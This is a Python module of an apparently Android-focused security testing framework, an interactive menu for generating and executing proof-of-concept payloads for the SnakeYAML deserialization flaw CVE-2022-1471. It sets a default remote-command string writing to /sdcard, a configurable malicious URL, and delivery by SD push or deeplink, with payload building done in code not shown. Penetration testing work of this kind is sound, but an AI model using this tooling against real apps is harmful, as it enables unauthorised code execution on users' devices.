import readline
import shlex

from colorama import Fore
from Classes.constants import Constants
from Classes.utils import back, listmodules, print_help, unknown_cmd

class SnakeYamlExploit:
    _description: str
    _name: str

    @property
    def name(self):
        return self._name

    @property
    def description(self):
        return self._description

    def __init__(self) -> None:
        self._description = "Exploit CVE-2022-1471 in SnakeYaml Implementation"
        self._name = "snakeyamlexploit"
    
    def execute(self, mmsf):
        def generate_malicious_poc(mmsf):            
            types = ["write_to_sd", "exec_cmd", "oob"]
            set_data = ["type", "path", "payload", "filename", "mal_url", "cmd"]
            snake_data = {
                "type": "write_to_sd",
                "path": Constants.DIR_LOOT_PATH.value,
                "filename": "snake_poc.yml",
                "mal_url": "http://localhost:8080",
                "cmd": 'touch /sdcard/command-executed.txt && echo \'RCE successful\' > /sdcard/command-executed.txt'
            }

            # waiting for input 
            while True:

                # set the autocompleters
                def data_completer(text, state):
                    options = [i for i in set_data if i.startswith(text)]
                    if state < len(options):
                        return options[state]
                    else:
                        return None

                def cmd_completer(text, state):
                    options = [i for i in Constants.MMSF_COMMANDS.value if i.startswith(text)]
                    if state < len(options):
                        return options[state]
                    else:
                        return None

                # The commands to be executed
                def execute(cmd, data):
                    status = 0
                    try:
                        status = mmsf.generate_malicious_poc(cmd, data)
                    except Exception as e:
                        print(Fore.RED + '[-] '+ str(e) + Fore.RESET)
                    return status
                    
                readline.set_completer(cmd_completer)

                # get user input
                input_val = shlex.split(input('mmsf (snakeyamlexploit/generate)> '))
                if len(input_val) >= 1:
                    command = input_val[0].lower()
                elif len(input_val) < 1:
                    continue
                else:
                    unknown_cmd()
                if command == "back":
                    back()
                    break
                elif command == "set":
                    # wait for data to be set
                    while True:
                        readline.set_completer(data_completer)
                        inpt = shlex.split(input('mmsf (snakeyamlexploit/generate/set)> '))
                        if len(inpt) > 1:
                            cmd, *args = inpt
                        elif len(inpt) < 1:
                            continue
                        else:
                            cmd = inpt[0]
                            args = None
                        if args:
                            if cmd.lower() == "type":
                                if args[0].lower() not in types:
                                    continue
                                snake_data["type"] = args[0]
                            elif cmd.lower() == "path":
                                snake_data["path"] = args[0]
                            elif cmd.lower() == "filename":
                                snake_data["filename"] = args[0]
                            elif cmd.lower() == "mal_url":
                                snake_data["mal_url"] = args[0]
                            elif cmd.lower() == "cmd":
                                snake_data["cmd"] = args[0]
                        else:
                            if execute(cmd.lower(), snake_data):
                                break
                else:
                    if execute(command, snake_data) == 2:
                        break

        def execute_malicious_poc(mmsf):            
            types = ["push_to_sd", "launch_deeplink"]
            set_data = ["type", "path", "payload", "filename", "mal_url", "cmd", "exec_mode", "app_name"]
            snake_data = {
                "type": "write_to_sd",
                "path": Constants.DIR_LOOT_PATH.value,
                "filename": "snake_poc.yml",
                "mal_url": "http://localhost:8080",
                "cmd": 'touch /sdcard/command-executed.txt && echo \'RCE successful\' > /sdcard/command-executed.txt',
                "app_name": "",
                "exec_mode": "push_to_sd",
                "component": ""
            }

            # waiting for input 
            while True:

                # set the autocompleters
                def data_completer(text, state):
                    options = [i for i in set_data if i.startswith(text)]
                    if state < len(options):
                        return options[state]
                    else:
                        return None

                def cmd_completer(text, state):
                    options = [i for i in Constants.MMSF_COMMANDS.value if i.startswith(text)]
                    if state < len(options):
                        return options[state]
                    else:
                        return None

                # The commands to be executed
                def execute(cmd, data):
                    status = 0
                    try:
                        status = mmsf.execute_malicious_poc(cmd, data)
                    except Exception as e:
                        print(Fore.RED + '[-] '+ str(e) + Fore.RESET)
                    return status
                    
                readline.set_completer(cmd_completer)

                # get user input
                input_val = shlex.split(input('mmsf (snakeyamlexploit/execute)> '))
                if len(input_val) >= 1:
                    command = input_val[0].lower()
                elif len(input_val) < 1:
                    continue
                else:
                    unknown_cmd()
                if command == "back":
                    back()
                    break
                elif command == "set":
                    # wait for data to be set
                    while True:
                        readline.set_completer(data_completer)
                        inpt = shlex.split(input('mmsf (snakeyamlexploit/execute/set)> '))
                        if len(inpt) > 1:
                            cmd, *args = inpt
                        elif len(inpt) < 1:
                            continue
                        else:
                            cmd = inpt[0]
                            args = None
                        if args:
                            if cmd.lower() == "type":
                                if args[0].lower() not in types:
                                    continue
                                snake_data["type"] = args[0]
                            elif cmd.lower() == "path":
                                snake_data["path"] = args[0]
                            elif cmd.lower() == "filename":
                                snake_data["filename"] = args[0]
                            elif cmd.lower() == "mal_url":
                                snake_data["mal_url"] = args[0]
                            elif cmd.lower() == "cmd":
                                snake_data["cmd"] = args[0]
                            elif cmd.lower() == "app_name":
                                snake_data["app_name"] = args[0]
                            elif cmd.lower() == "exec_mode":
                                snake_data["exec_mode"] = args[0]
                            elif cmd.lower() == "component":
                                snake_data["component"] = args[0]
                        else:
                            if execute(cmd.lower(), snake_data):
                                break
                else:
                    if execute(command, snake_data) == 2:
                        break

        modules = ["generate", "execute"]
        descriptions = [
            "Generate a malicious PoC file for Snake Yaml Exploit", 
            "Execute the SnakeYaml Exploit"]

        while True:
            def init_completer(text, state):
                    options = [i for i in modules if i.startswith(text)]
                    if state < len(options):
                        return options[state]
                    else:
                        return None

            readline.set_completer(init_completer)

            input_val = shlex.split(input('mmsf (snakeyamlexploit)> '))
            if len(input_val) < 1:
                continue
            if len(input_val) > 2:
                continue
            elif input_val[0].lower() == "exit":
                quit()
            elif input_val[0].lower() == "listmodules":
                listmodules(modules, descriptions)
            elif input_val[0].lower() == "usemodule":
                action = input_val[1].lower()
                if action not in modules:
                    unknown_cmd()
                elif action == "generate":
                    generate_malicious_poc(mmsf)
                elif action == "execute":
                    execute_malicious_poc(mmsf)

            elif input_val[0].lower() == "back":
                back()
                break
            elif input_val[0].lower() == "help" or input_val[0] == "?":
                print_help()